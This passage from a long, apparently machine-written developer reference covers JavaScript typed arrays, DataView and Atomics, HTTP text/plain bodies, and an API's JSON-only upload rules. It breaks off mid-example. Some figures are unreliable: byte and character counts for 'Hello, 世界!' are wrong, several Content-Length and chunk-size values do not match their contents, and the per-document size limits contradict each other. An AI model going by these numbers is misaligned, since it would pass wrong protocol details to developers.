view.setUint32(1, 0x12345678, true); // Valid with DataView

// Attempting same with typed array requires alignment
try {
  const uint32 = new Uint32Array(buffer, 1); // Offset 1 not aligned to 4
} catch (e) {
  console.log(e instanceof RangeError); // true
}
```

[Inference] DataView methods perform byte-by-byte operations when necessary, avoiding hardware alignment requirements. This flexibility trades off some performance compared to aligned typed array access.

### Binary Data Patterns and Protocols

#### Structure Serialization

DataView enables reading/writing C-style structures:

```javascript
// Serialize a structure: { id: uint32, x: float32, y: float32, flags: uint8 }
function serializePoint(id, x, y, flags) {
  const buffer = new ArrayBuffer(13);
  const view = new DataView(buffer);
  
  view.setUint32(0, id, true);
  view.setFloat32(4, x, true);
  view.setFloat32(8, y, true);
  view.setUint8(12, flags);
  
  return buffer;
}

// Deserialize
function deserializePoint(buffer) {
  const view = new DataView(buffer);
  
  return {
    id: view.getUint32(0, true),
    x: view.getFloat32(4, true),
    y: view.getFloat32(8, true),
    flags: view.getUint8(12)
  };
}

const buffer = serializePoint(1001, 12.5, -7.3, 0b00001111);
const point = deserializePoint(buffer);
console.log(point); // { id: 1001, x: 12.5, y: -7.3, flags: 15 }
```

This pattern enables binary protocol implementation and interoperability with native code.

#### Bit Field Manipulation

Typed arrays facilitate bit-level operations:

```javascript
const flags = new Uint8Array([0b00000000]);

// Set individual bits
function setBit(array, index, bitPosition) {
  array[index] |= (1 << bitPosition);
}

// Clear bits
function clearBit(array, index, bitPosition) {
  array[index] &= ~(1 << bitPosition);
}

// Test bits
function testBit(array, index, bitPosition) {
  return (array[index] & (1 << bitPosition)) !== 0;
}

setBit(flags, 0, 3); // Set bit 3
setBit(flags, 0, 7); // Set bit 7
console.log(flags[0].toString(2).padStart(8, '0')); // 10001000

console.log(testBit(flags, 0, 3)); // true
console.log(testBit(flags, 0, 2)); // false

clearBit(flags, 0, 3);
console.log(flags[0].toString(2).padStart(8, '0')); // 10000000
```

Multiple flags pack efficiently into typed arrays for memory-efficient boolean storage.

#### Variable-Length Integer Encoding

Implementing variable-length encodings like UTF-8 or Protocol Buffers varints:

```javascript
// Encode unsigned integer as varint (7 bits per byte, MSB indicates continuation)
function encodeVarint(value) {
  const bytes = [];
  
  while (value > 0x7F) {
    bytes.push((value & 0x7F) | 0x80); // Set continuation bit
    value >>>= 7;
  }
  bytes.push(value & 0x7F);
  
  return new Uint8Array(bytes);
}

// Decode varint
function decodeVarint(array, offset = 0) {
  let value = 0;
  let shift = 0;
  let position = offset;
  
  while (position < array.length) {
    const byte = array[position++];
    value |= (byte & 0x7F) << shift;
    
    if ((byte & 0x80) === 0) break; // No continuation bit
    shift += 7;
  }
  
  return { value, bytesRead: position - offset };
}

const encoded = encodeVarint(300);
console.log([...encoded]); // [172, 2] (0b10101100, 0b00000010)

const { value } = decodeVarint(encoded);
console.log(value); // 300
```

This demonstrates using typed arrays for efficient wire format implementations.

### Conversion Between Types

#### Type Conversion Through Views

Creating different typed array views reinterprets the same bytes:

```javascript
const buffer = new ArrayBuffer(4);

const floatView = new Float32Array(buffer);
floatView[0] = 3.14159;

// Reinterpret same bytes as integers
const intView = new Int32Array(buffer);
console.log(intView[0]); // Integer representation of float bits

const uint8View = new Uint8Array(buffer);
console.log([...uint8View]); // Individual bytes of the float
```

[Inference] This enables examining internal representations of floating point numbers, implementing type punning, or debugging binary formats by viewing data through multiple lenses.

#### Value Coercion Rules

Assigning values to typed arrays coerces to the target type:

```javascript
const uint8 = new Uint8Array(5);

// Truncation to integer
uint8[0] = 3.7;
console.log(uint8[0]); // 3

// Wrapping for overflow
uint8[1] = 256;
console.log(uint8[1]); // 0

uint8[2] = -1;
console.log(uint8[2]); // 255

// String to number conversion
uint8[3] = "42";
console.log(uint8[3]); // 42

uint8[4] = "invalid";
console.log(uint8[4]); // 0 (NaN converts to 0)
```

Signed integer arrays use two's complement wrapping:

```javascript
const int8 = new Int8Array(3);

int8[0] = 128; // Wraps to -128
console.log(int8[0]); // -128

int8[1] = -129; // Wraps to 127
console.log(int8[1]); // 127
```

#### Cross-Type Array Creation

Creating a typed array from another typed array copies and converts values:

```javascript
const float32 = new Float32Array([1.1, 2.7, 3.9]);
const uint8 = new Uint8Array(float32);

console.log([...uint8]); // [1, 2, 3] - values truncated

const int8 = new Int8Array([-1, -2, -3]);
const uint8Copy = new Uint8Array(int8);

console.log([...uint8Copy]); // [255, 254, 253] - reinterpreted as unsigned
```

[Inference] Cross-type conversion creates a new buffer and copies elements with appropriate value conversion. This differs from viewing the same buffer through different typed arrays, which reinterprets bytes without value conversion.

### Memory Sharing and Atomics

#### SharedArrayBuffer Fundamentals

SharedArrayBuffer enables memory sharing between workers:

```javascript
// Main thread
const shared = new SharedArrayBuffer(16);
const sharedView = new Int32Array(shared);

sharedView[0] = 42;

worker.postMessage(shared);

// Worker thread
self.onmessage = (event) => {
  const shared = event.data;
  const view = new Int32Array(shared);
  
  console.log(view[0]); // 42 - same memory
  view[0] = 100; // Visible to main thread
};
```

[Inference] SharedArrayBuffer maps to shared memory regions that multiple threads can access simultaneously. This requires careful synchronization to prevent race conditions.

#### Atomic Operations for Synchronization

The Atomics object provides atomic operations on SharedArrayBuffer-backed integer typed arrays:

```javascript
const shared = new SharedArrayBuffer(4);
const view = new Int32Array(shared);

// Atomic add
Atomics.add(view, 0, 5); // Atomically adds 5 to view[0]

// Atomic compare-and-exchange
const old = Atomics.compareExchange(view, 0, 5, 10);
// If view[0] === 5, sets it to 10 and returns 5

// Atomic load/store
Atomics.store(view, 0, 42);
const value = Atomics.load(view, 0);

// Wait/notify for coordination
// Thread 1 waits
Atomics.wait(view, 0, 0); // Blocks until view[0] !== 0 or notified

// Thread 2 notifies
Atomics.store(view, 0, 1);
Atomics.notify(view, 0); // Wake waiting threads
```

[Inference] Atomic operations prevent torn reads/writes where one thread sees partial updates from another. They provide the memory ordering guarantees necessary for lock-free algorithms.

Available atomic operations:

- `Atomics.add()` - Atomic addition
- `Atomics.sub()` - Atomic subtraction
- `Atomics.and()` - Atomic bitwise AND
- `Atomics.or()` - Atomic bitwise OR
- `Atomics.xor()` - Atomic bitwise XOR
- `Atomics.load()` - Atomic read
- `Atomics.store()` - Atomic write
- `Atomics.exchange()` - Atomic swap
- `Atomics.compareExchange()` - Compare-and-swap
- `Atomics.wait()` - Wait for change
- `Atomics.notify()` - Wake waiting threads

#### Race Condition Prevention

Without atomics, concurrent access causes races:

```javascript
// Race condition example
const shared = new SharedArrayBuffer(4);
const view = new Int32Array(shared);
view[0] = 0;

// Multiple workers incrementing
function increment() {
  const current = view[0]; // Read
  // Another worker might read here
  view[0] = current + 1; // Write
}

// Two workers executing increment() simultaneously might both read 0,
// then both write 1, resulting in only one increment instead of two
```

Atomic operations prevent this:

```javascript
// Safe increment
function atomicIncrement() {
  Atomics.add(view, 0, 1); // Atomic read-modify-write
}

// Two workers calling atomicIncrement() correctly results in two increments
```

### Performance Characteristics

#### Access Pattern Performance

Sequential access benefits from CPU cache prefetching:

```javascript
const array = new Float32Array(1000000);

// Fast: sequential access
console.time('sequential');
for (let i = 0; i < array.length; i++) {
  array[i] = i * 2;
}
console.timeEnd('sequential');

// Slower: random access
console.time('random');
for (let i = 0; i < array.length; i++) {
  const randomIndex = Math.floor(Math.random() * array.length);
  array[randomIndex] = i;
}
console.timeEnd('random');
```

[Inference] Sequential access patterns allow CPU hardware prefetchers to load cache lines ahead of access, minimizing memory latency. Random access patterns defeat prefetching, causing cache misses.

#### Type-Specific Performance Differences

[Inference] Operations on smaller integer types may be slower than 32-bit integers on some architectures due to sign/zero extension requirements:

```javascript
// 32-bit operations often fastest
const uint32 = new Uint32Array(1000000);

// 8-bit operations may require extension
const uint8 = new Uint8Array(1000000);

// Floating point performance depends on FPU capabilities
const float64 = new Float64Array(1000000);
```

However, smaller types use less memory bandwidth and cache space, potentially offsetting per-operation costs for large datasets.

#### Alignment Performance Impact

[Inference] Aligned access performs better than unaligned access on most architectures:

```javascript
const buffer = new ArrayBuffer(1024);

// Aligned access (offset multiple of element size)
const alignedView = new Uint32Array(buffer, 0);

// Potentially slower unaligned access via DataView
const dataView = new DataView(buffer);
dataView.setUint32(1, 0x12345678); // Offset 1 not aligned to 4
```

Modern x86 processors handle unaligned access efficiently but with some penalty. ARM processors may have more significant performance impact or require alignment.

#### Subarray vs Slice Performance

Subarray creates views without copying, making it O(1):

```javascript
const large = new Uint8Array(10000000);

console.time('subarray');
const sub = large.subarray(1000, 2000);
console.timeEnd('subarray'); // Very fast, just creates view

console.time('slice');
const sliced = large.slice(1000, 2000);
console.timeEnd('slice'); // Slower, copies 1000 elements
```

Use subarray when shared memory is acceptable, slice when independent copies are needed.

### Integration with Web APIs

#### Canvas ImageData

Canvas ImageData uses Uint8ClampedArray for pixel data:

```javascript
const canvas = document.createElement('canvas');
const ctx = canvas.getContext('2d');
canvas.width = 100;
canvas.height = 100;

const imageData = ctx.getImageData(0, 0, 100, 100);
console.log(imageData.data instanceof Uint8ClampedArray); // true
console.log(imageData.data.length); // 40000 (100 * 100 * 4 RGBA bytes)

// Manipulate pixels directly
for (let i = 0; i < imageData.data.length; i += 4) {
  imageData.data[i] = 255;     // Red
  imageData.data[i + 1] = 0;   // Green
  imageData.data[i + 2] = 0;   // Blue
  imageData.data[i + 3] = 255; // Alpha
}

ctx.putImageData(imageData, 0, 0);
```

[Inference] Uint8ClampedArray's clamping behavior prevents overflow artifacts when performing image operations that might exceed 0-255 range.

#### Web Audio API

AudioBuffer uses Float32Array for sample data:

```javascript
const audioContext = new AudioContext();
const buffer = audioContext.createBuffer(
  2, // stereo
  audioContext.sampleRate * 2, // 2 seconds
  audioContext.sampleRate
);

// Get channel data as Float32Array
const leftChannel = buffer.getChannelData(0);
const rightChannel = buffer.getChannelData(1);

console.log(leftChannel instanceof Float32Array); // true

// Generate sine wave
const frequency = 440; // A4
for (let i = 0; i < leftChannel.length; i++) {
  const t = i / audioContext.sampleRate;
  leftChannel[i] = Math.sin(2 * Math.PI * frequency * t);
  rightChannel[i] = leftChannel[i];
}
```

Float32Array provides the precision necessary for audio sample representation, typically normalized to ±1.0 range.

#### WebGL Buffers

WebGL operations use typed arrays for vertex and texture data:

```javascript
const gl = canvas.getContext('webgl');

// Vertex positions
const vertices = new Float32Array([
  -1.0, -1.0,
   1.0, -1.0,
   0.0,  1.0
]);

const buffer = gl.createBuffer();
gl.bindBuffer(gl.ARRAY_BUFFER, buffer);
gl.bufferData(gl.ARRAY_BUFFER, vertices, gl.STATIC_DRAW);

// Index buffer
const indices = new Uint16Array([0, 1, 2]);
const indexBuffer = gl.createBuffer();
gl.bindBuffer(gl.ELEMENT_ARRAY_BUFFER, indexBuffer);
gl.bufferData(gl.ELEMENT_ARRAY_BUFFER, indices, gl.STATIC_DRAW);
```

[Inference] WebGL implementations typically pass typed array data directly to GPU memory or perform optimized copies, avoiding intermediate JavaScript array conversions.

#### Fetch and Blob

ArrayBuffer integrates with Fetch API for binary data:

```javascript
// Fetch binary data
const response = await fetch('data.bin');
const buffer = await response.arrayBuffer();
const view = new Uint8Array(buffer);

// Upload binary data
const uploadData = new Uint8Array([1, 2, 3, 4, 5]);
await fetch('/upload', {
  method: 'POST',
  body: uploadData.buffer,
  headers: {
    'Content-Type': 'application/octet-stream'
  }
});

// Create Blob from ArrayBuffer
const blob = new Blob([buffer], { type: 'application/octet-stream' });

// Convert Blob to ArrayBuffer
const blobBuffer = await blob.arrayBuffer();
```

#### File API

File reading produces ArrayBuffer:

```javascript
const fileInput = document.querySelector('input[type="file"]');

fileInput.addEventListener('change', async (e) => {
  const file = e.target.files[0];
  
  // Read as ArrayBuffer
  const buffer = await file.arrayBuffer();
  const view = new Uint8Array(buffer);
  
  // Process binary file data
  console.log('File size:', view.length);
  console.log('First bytes:', view.slice(0, 16));
});
```

### WebAssembly Integration

#### Memory Access from JavaScript

WebAssembly memory exposes as ArrayBuffer:

```javascript
const wasmMemory = new WebAssembly.Memory({ initial: 1 }); // 1 page = 64KB

console.log(wasmMemory.buffer instanceof ArrayBuffer); // true
console.log(wasmMemory.buffer.byteLength); // 65536

// Access WASM memory from JavaScript
const memView = new Uint8Array(wasmMemory.buffer);
memView[0] = 42;

// Grow memory
wasmMemory.grow(1); // Add 1 page

// Note: After grow(), old buffer becomes detached
const newView = new Uint8Array(wasmMemory.buffer);
console.log(newView[0]); // 42 - data preserved
```

[Inference] Memory growth detaches the previous ArrayBuffer to maintain safety. Code must re-acquire buffer references after growth operations.

#### Passing Data to WebAssembly

WebAssembly functions receive memory offsets, not direct array references:

```javascript
// WASM module exports function: processArray(ptr, length)
const wasmInstance = await WebAssembly.instantiateStreaming(
  fetch('module.wasm')
);

const data = new Float32Array([1.0, 2.0, 3.0, 4.0]);

// Allocate space in WASM memory (assuming exported alloc function)
const ptr = wasmInstance.exports.alloc(data.byteLength);

// Copy data to WASM memory
const wasmMemory = new Float32Array(
  wasmInstance.exports.memory.buffer,
  ptr,
  data.length
);
wasmMemory.set(data);

// Call WASM function with pointer and length
wasmInstance.exports.processArray(ptr, data.length);

// Read results back
const results = wasmMemory.slice(0, data.length);
```

This pattern enables efficient data exchange between JavaScript and WebAssembly.

### Security and Safety Considerations

#### Bounds Checking Guarantees

Typed arrays provide automatic bounds checking:

```javascript
const array = new Uint8Array(10);

array[100] = 42; // Out of bounds - no effect
console.log(array[100]); // undefined - no crash

// DataView also bounds-checked
const buffer = new ArrayBuffer(10);
const view = new DataView(buffer);

try {
  view.getUint32(8); // Would read bytes 8-11, but only 0-9 available
} catch (e) {
  console.log(e instanceof RangeError); // true
}
```

[Inference] Bounds checking prevents buffer overflow vulnerabilities that plague C/C++ code. Out-of-bounds reads return undefined, writes have no effect, and DataView methods throw on invalid access.

#### Detached Buffer Protection

Accessing detached buffers throws TypeError:

```javascript
const buffer = new ArrayBuffer(16);
const view = new Uint8Array(buffer);

view[0] = 42; // Works

// Transfer buffer (detaches it)
const transferred = buffer.transfer();

try {
  view[0] = 100; // buffer is detached
} catch (e) {
  console.log(e instanceof TypeError); // true - cannot access detached buffer
}

console.log(buffer.byteLength); // 0 - detached
```

[Inference] Detachment prevents use-after-free bugs by making the original buffer permanently inaccessible rather than leaving dangling references.

#### Type Safety Through Views

Typed arrays enforce element type constraints:

```javascript
const uint8 = new Uint8Array([1, 2, 3]);
const float32 = new Float32Array(uint8.buffer);

// Each view maintains type safety
uint8[0] = 300; // Wraps to 44
console.log(uint8[0]); // 44 - enforced uint8 range

float32[0] = 3.14;
console.log(float32[0]); // 3.14 - valid float
console.log(uint8[0]); // Different interpretation of same bytes
```

[Inference] Type safety prevents accidental misinterpretation when each access explicitly specifies expected type, unlike void* pointers in C which provide no type information.

---

## Text/Plain Bodies

### Character Encoding

Text/plain content requires character encoding specification. Default encoding is US-ASCII if not specified, but UTF-8 is standard practice.

```
Content-Type: text/plain; charset=utf-8
Content-Type: text/plain; charset=iso-8859-1
Content-Type: text/plain; charset=windows-1252
```

The `charset` parameter determines how bytes map to characters. Without explicit charset, content interpretation becomes ambiguous.

UTF-8 encoding handles all Unicode characters using 1-4 bytes per character:

- ASCII characters (U+0000 to U+007F): 1 byte
- Latin extended, Greek, Cyrillic, etc. (U+0080 to U+07FF): 2 bytes
- Most other characters including CJK (U+0800 to U+FFFF): 3 bytes
- Supplementary characters (U+10000 to U+10FFFF): 4 bytes

### Content-Length Calculation

Content-Length represents byte count, not character count. For multi-byte encodings like UTF-8, character count differs from byte count.

```
POST /api/message HTTP/1.1
Content-Type: text/plain; charset=utf-8
Content-Length: 13

Hello, 世界!
```

"Hello, 世界!" is 9 characters but 13 bytes (each Chinese character requires 3 bytes in UTF-8).

Incorrect Content-Length causes truncation or hanging connections. Server may wait for bytes that never arrive or client may disconnect before receiving complete response.

### Line Endings

Text/plain may use different line ending conventions:

- Unix/Linux: LF (`\n`, 0x0A)
- Windows: CRLF (`\r\n`, 0x0D 0x0A)
- Classic Mac: CR (`\r`, 0x0D)

HTTP protocol itself uses CRLF for headers, but message body line endings depend on content origin. Servers and clients should handle all conventions.

```
POST /api/log HTTP/1.1
Content-Type: text/plain; charset=utf-8
Content-Length: 24

Line 1\r\nLine 2\r\nLine 3
```

Some applications normalize line endings on receipt, others preserve original format.

### Whitespace Handling

Text/plain preserves all whitespace characters:

- Space (0x20)
- Tab (0x09)
- Line feed (0x0A)
- Carriage return (0x0D)
- Non-breaking space (0xA0 in ISO-8859-1, 0xC2 0xA0 in UTF-8)

Unlike HTML where consecutive whitespace collapses, text/plain maintains exact spacing:

```
Hello    world
    Indented line
Another line
```

Applications rendering text/plain should display whitespace as-is, typically using monospace fonts.

### Content Disposition

Text/plain responses can specify inline display or download:

```
Content-Type: text/plain; charset=utf-8
Content-Disposition: inline

Content-Type: text/plain; charset=utf-8
Content-Disposition: attachment; filename="data.txt"
```

`inline`: Browser displays content directly `attachment`: Browser prompts download

Filename parameter suggests name for saved file. Should use ASCII characters or percent-encoding for compatibility.

```
Content-Disposition: attachment; filename="report.txt"; filename*=UTF-8''%E3%83%AC%E3%83%9D%E3%83%BC%E3%83%88.txt
```

The `filename*` parameter (RFC 5987) supports UTF-8 filenames for international characters.

### Compression

Text/plain content benefits significantly from compression due to repetitive patterns.

```
Content-Type: text/plain; charset=utf-8
Content-Encoding: gzip
Content-Length: 1247
```

Compression ratios for text typically range 50-90% depending on content structure. Gzip, Deflate, and Brotli all work effectively.

Compressed Content-Length reflects compressed size. Original size not directly indicated (may be inferred after decompression).

### Byte Order Mark (BOM)

UTF-8 content may include optional BOM (0xEF 0xBB 0xBF) at start:

```
Content-Type: text/plain; charset=utf-8
Content-Length: 17

\xEF\xBB\xBFHello, world!
```

BOM presence is controversial:

- Not required for UTF-8 (encoding order is defined)
- Helps some applications detect UTF-8
- Can cause issues with applications treating it as visible characters
- Unix tools often strip or ignore BOM

Best practice: omit BOM for UTF-8, include only if interoperability requires.

### Range Requests

Text/plain supports byte-range requests like other content types:

```
GET /log.txt HTTP/1.1
Range: bytes=0-999
```

Response:

```
HTTP/1.1 206 Partial Content
Content-Type: text/plain; charset=utf-8
Content-Range: bytes 0-999/50000
Content-Length: 1000

[first 1000 bytes of text]
```

Byte ranges may split multi-byte characters in UTF-8, resulting in invalid sequences at boundaries. Applications requesting ranges should handle incomplete characters at boundaries or request complete character ranges.

[Inference] Implementations often request ranges aligned to line boundaries to avoid character splitting issues.

### Streaming

Text/plain works well with streaming/chunked transfer encoding for large or unbounded content:

```
HTTP/1.1 200 OK
Content-Type: text/plain; charset=utf-8
Transfer-Encoding: chunked

1a
First chunk of text data
1c
Second chunk of text data
0

```

Each chunk specifies size in hexadecimal, followed by CRLF, chunk data, and another CRLF. Final chunk has size 0.

Streaming enables:

- Real-time log tailing
- Progress indication for long-running operations
- Server-sent events (though text/event-stream preferred)
- Reduced memory requirements for large files

### Newline Conventions in APIs

REST APIs using text/plain for request bodies should document expected line ending convention:

```
POST /api/bulk-insert HTTP/1.1
Content-Type: text/plain; charset=utf-8
Content-Length: 45

record1,value1,value2
record2,value3,value4
```

Common conventions:

- Unix-style LF for simplicity and consistency
- Accept any line ending variant for flexibility
- Normalize on receipt to internal format

Documentation should specify whether trailing newline is required, optional, or prohibited.

### Special Characters

Text/plain can represent any Unicode character through proper encoding. Common special characters:

**Control characters:**

- Null (0x00): Valid in UTF-8 but often problematic in C-style string handling
- Tab (0x09): Standard whitespace
- Escape (0x1B): Sometimes used for terminal control sequences

**Unicode categories:**

- Zero-width characters (ZWSP, ZWNJ, ZWJ): Valid but invisible
- Direction markers (LRM, RLM, LRE, RLE, PDF): Control text direction
- Private use areas: Valid but application-specific meaning

**Normalization:** Unicode provides multiple representations for some characters (e.g., é as single character U+00E9 or e + combining acute U+0065 U+0301). Applications may normalize to canonical form (NFC) or decomposed form (NFD).

### Maximum Size Limits

No protocol-level maximum for text/plain bodies, but practical limits exist:

**Server limits:**

- Application servers typically limit request body size (1MB-100MB common)
- Web servers impose their own limits (nginx: 1MB default, Apache: no default limit)
- Proxies and load balancers may enforce stricter limits

**Client limits:**

- Browsers don't generally limit response sizes
- Memory constraints affect practical maximum
- Some libraries impose limits (configurable)

Large text files should consider:

- Pagination for structured data
- Streaming for continuous data
- Compression to reduce transfer size
- Alternative formats (binary protocols) for very large datasets

### Content Negotiation

Clients may request text/plain explicitly:

```
GET /resource HTTP/1.1
Accept: text/plain, text/html;q=0.9, application/json;q=0.8
```

Quality values indicate preference. Server selects best match and responds with actual Content-Type.

If server cannot provide text/plain, responds with:

```
HTTP/1.1 406 Not Acceptable
```

Or provides alternative format and lets client decide if acceptable.

### Security Considerations

**Injection attacks:** Text/plain content displayed in browsers doesn't execute scripts, but context matters:

- If application renders as HTML, vulnerable to injection
- If used in shell commands, vulnerable to command injection
- If used in SQL queries, vulnerable to SQL injection

Always validate and sanitize text/plain input before using in other contexts.

**Content sniffing:** Browsers may ignore declared Content-Type and interpret content based on analysis. Text containing HTML-like patterns might be executed as HTML.

Prevent with:

```
X-Content-Type-Options: nosniff
```

**Encoding attacks:** Invalid UTF-8 sequences or overlong encodings can bypass security filters:

- Null bytes encoded as overlong UTF-8
- Directory traversal characters in unexpected encodings
- Homograph attacks using similar-looking Unicode characters

Validate encoding correctness and reject invalid sequences.

**Size-based attacks:** Extremely large text bodies can cause:

- Memory exhaustion (DoS)
- Disk exhaustion (log files)
- CPU exhaustion (processing)

Enforce reasonable limits and implement streaming for large inputs.

### Media Type Parameters

Text/plain supports additional parameters beyond charset:

```
Content-Type: text/plain; charset=utf-8; format=flowed
Content-Type: text/plain; charset=utf-8; delsp=yes
```

**format=flowed** (RFC 3676): Indicates text formatted with flowed text rules:

- Lines ending in space are soft-wrapped (logical continuation)
- Lines without trailing space are hard breaks (paragraph boundaries)
- Allows reflowing text to different display widths

```
This is a long line that has been wrapped 
for transmission but should reflow.
This is a new paragraph.
```

**delsp parameter:**

- `delsp=yes`: Delete trailing space when reflowing
- `delsp=no`: Preserve trailing space

[Unverified] Limited support in modern applications; primarily used in email contexts.

### Language Specification

Content-Language header indicates natural language:

```
Content-Type: text/plain; charset=utf-8
Content-Language: en
Content-Language: en-US
Content-Language: ja
```

Doesn't affect encoding but informs language-aware processing (spell-check, translation, locale-specific rendering).

### Empty Bodies

Text/plain may have empty body:

```
HTTP/1.1 200 OK
Content-Type: text/plain; charset=utf-8
Content-Length: 0

```

Or omit Content-Length with no body (when using Connection: close or HTTP/1.0).

Empty response valid for operations with no output (acknowledgments, deletions).

### MIME Multipart

Text/plain can appear within multipart messages:

```
Content-Type: multipart/mixed; boundary=frontier

--frontier
Content-Type: text/plain; charset=utf-8

First part as plain text
--frontier
Content-Type: text/plain; charset=utf-8

Second part as plain text
--frontier--
```

Each part has its own headers and body. Boundary delimiter separates parts. Final boundary includes trailing `--`.

### Base64 Encoding in Transit

Text/plain sometimes base64-encoded for transport through binary-unsafe channels:

```
Content-Type: text/plain; charset=utf-8
Content-Transfer-Encoding: base64

SGVsbG8sIHdvcmxkIQ==
```

HTTP itself is 8-bit clean, so this primarily appears in:

- Email (MIME)
- Embedded data URLs
- Legacy protocols

Modern HTTP typically sends text/plain directly without additional encoding.

### Concatenation

Multiple text/plain parts can be concatenated directly:

```
HTTP/1.1 200 OK
Content-Type: text/plain; charset=utf-8
Transfer-Encoding: chunked

a
Part one\n
a
Part two\n
0

```

Concatenated result:

```
Part one
Part two
```

This differs from JSON or XML where concatenation produces invalid documents. Text/plain's unstructured nature permits simple concatenation.

### Interoperability

Text/plain maximizes interoperability:

- Viewable in any text editor
- Processable with standard Unix tools (grep, sed, awk)
- No parsing libraries required
- Language-agnostic
- Platform-independent

Trade-off: lacks structure, requiring custom parsing for structured data. Consider alternatives (CSV, JSON, XML) when structure needed.

### Caching

Text/plain cached like other content:

```
Cache-Control: public, max-age=3600
ETag: "33a64df551425fcc55e4d42a148795d9f25f89d4"
Last-Modified: Wed, 21 Oct 2015 07:28:00 GMT
```

Static text files often highly cacheable. Dynamic text (logs, status) typically not cached or with short lifetime.

Vary header indicates cache keys:

```
Vary: Accept-Encoding, Accept-Language
```

Cache stores separate versions for different encodings/languages.

### Content Transformation

Proxies may transform text/plain:

- Compression/decompression
- Charset transcoding
- Line ending normalization
- Whitespace manipulation

Prevent with:

```
Cache-Control: no-transform
```

Transformations can alter Content-Length, Content-Encoding, and introduce subtle bugs if not handled properly.

### Partial Updates

Text/plain supports HTTP PATCH for partial updates, though encoding varies by implementation:

**Plain text replacement:**

```
PATCH /document.txt HTTP/1.1
Content-Type: text/plain; charset=utf-8
Content-Length: 11

New content
```

Complete replacement of resource.

**Line-based operations:** Custom formats specify which lines to add/remove/modify. No standard format exists for text/plain patches.

**Diff format:**

```
PATCH /document.txt HTTP/1.1
Content-Type: text/plain; charset=utf-8

@@ -1,3 +1,3 @@
 Line 1
-Line 2
+Modified line 2
 Line 3
```

Unified diff format, though application/diff-patch better Content-Type choice.

[Inference] Most APIs treat text/plain PATCH as full replacement rather than partial update due to lack of standardized patch format.

### Version Control Headers

Text/plain with version tracking may use custom headers:

```
GET /document.txt HTTP/1.1

HTTP/1.1 200 OK
Content-Type: text/plain; charset=utf-8
X-Document-Version: 42
X-Last-Author: user@example.com
```

Version information enables optimistic concurrency:

```
PUT /document.txt HTTP/1.1
Content-Type: text/plain; charset=utf-8
If-Match: "version-42"

Updated content
```

Server rejects if version changed, preventing lost updates.

### Logging and Debugging

Text/plain ideal for log files and debug output:

```
GET /logs/app.log HTTP/1.1
Range: bytes=-10240

HTTP/1.1 206 Partial Content
Content-Type: text/plain; charset=utf-8
Content-Range: bytes 10234880-10245119/10245120

[recent 10KB of logs]
```

Advantages:

- Human-readable
- Greppable
- Streamable
- Appendable without parsing
- Tool-compatible

Streaming logs:

```
HTTP/1.1 200 OK
Content-Type: text/plain; charset=utf-8
Transfer-Encoding: chunked

[chunks of log data as generated]
```

Client receives log lines as they occur, enabling real-time monitoring.

---

## Multipart Form Data

### API Rejection of Multipart Encoding

The Anthropic API does **not** accept multipart form data (`multipart/form-data`) for any endpoints. All requests must use `application/json` encoding exclusively.

Attempting to send multipart requests results in a `400 Bad Request` error:

```json
{
  "type": "error",
  "error": {
    "type": "invalid_request_error",
    "message": "Invalid content type. Expected application/json"
  }
}
```

### Binary Data Transmission Without Multipart

Despite rejecting multipart encoding, the API supports binary data transmission through base64 encoding embedded within JSON payloads.

#### Image Upload Pattern

Images are transmitted as base64-encoded strings within JSON content blocks:

```json
{
  "model": "claude-sonnet-4-20250514",
  "messages": [{
    "role": "user",
    "content": [
      {
        "type": "image",
        "source": {
          "type": "base64",
          "media_type": "image/jpeg",
          "data": "/9j/4AAQSkZJRgABAQAAAQABAAD..."
        }
      },
      {
        "type": "text",
        "text": "What's in this image?"
      }
    ]
  }]
}
```

The entire request, including the base64 image data, is wrapped in a single JSON envelope with `Content-Type: application/json`.

#### Document Upload Pattern

PDFs follow the identical pattern:

```json
{
  "type": "document",
  "source": {
    "type": "base64",
    "media_type": "application/pdf",
    "data": "JVBERi0xLjQKJeLjz9MKMSAwIG9iago8PAovVHlwZSAv..."
  }
}
```

### Rationale for JSON-Only Architecture

The API's rejection of multipart encoding stems from several design decisions:

#### Parsing Simplicity

JSON-only requests eliminate the complexity of multipart boundary parsing, field extraction, and Content-Disposition header interpretation. Every request follows identical parsing logic regardless of content.

#### Type Safety

JSON schema validation applies uniformly across all request fields. Multipart encoding would require separate validation paths for form fields versus JSON fields.

#### Streaming Compatibility

The API's streaming response model (Server-Sent Events) operates on JSON structures. Accepting multipart requests while returning JSON responses creates asymmetry in the protocol.

#### Base64 Overhead Acceptability

For the API's use cases (images and documents as context for language model inference), the ~33% size overhead of base64 encoding is acceptable given typical file sizes (images: 100KB-5MB, PDFs: <10MB per document).

### Size Implications of Base64 Encoding

Base64 encoding expands binary data by approximately 33%:

|Raw Binary Size|Base64 Encoded Size|Overhead|
|---|---|---|
|100 KB|133 KB|+33 KB|
|1 MB|1.33 MB|+333 KB|
|5 MB|6.67 MB|+1.67 MB|

This overhead is included in request size limits. The API enforces a 5MB limit per individual image or document **after** base64 decoding, meaning the encoded string in JSON can be up to ~6.67MB.

### Request Size Limits

Total request size (including all JSON overhead, multiple images, text content, and base64 data) is limited to:

- **Standard tier**: 10MB per request
- **Images**: 5MB per image (decoded size)
- **Documents**: 32MB per document (decoded size)

Multiple images can be included in a single request as long as the cumulative encoded size remains under the total request limit.

### Alternative: URL-Based Resource Loading

To avoid base64 overhead, resources can be referenced by URL:

```json
{
  "type": "image",
  "source": {
    "type": "url",
    "url": "https://example.com/image.jpg"
  }
}
```

The API fetches the resource directly from the URL, eliminating base64 encoding entirely. This is the preferred method for large files or when files are already hosted.

#### URL Source Requirements

- URLs must use `https://` protocol (http:// rejected for security)
- Resources must be publicly accessible (no authentication supported)
- Response must include correct `Content-Type` header matching the resource type
- Resources must be available within the API's fetch timeout (~10 seconds)

### Performance Characteristics

#### Multipart vs JSON+Base64 Comparison

|Aspect|Multipart Form Data|JSON + Base64|
|---|---|---|
|**Encoding overhead**|None (binary as-is)|+33% size|
|**Parse complexity**|High (boundary detection)|Low (standard JSON)|
|**Request construction**|Complex (libraries needed)|Simple (native JSON)|
|**Type validation**|Mixed (per-field logic)|Uniform (JSON schema)|
|**Network efficiency**|Better for large files|Acceptable for typical sizes|

For the API's target file sizes (images under 5MB), the base64 overhead adds negligible latency (~100-300ms for encoding/decoding on modern hardware).

### Client Implementation Patterns

#### Python Implementation

```python
import base64
import json
import requests

# Read and encode image
with open('image.jpg', 'rb') as f:
    image_data = base64.b64encode(f.read()).decode('utf-8')

# Construct JSON request
payload = {
    "model": "claude-sonnet-4-20250514",
    "max_tokens": 1024,
    "messages": [{
        "role": "user",
        "content": [
            {
                "type": "image",
                "source": {
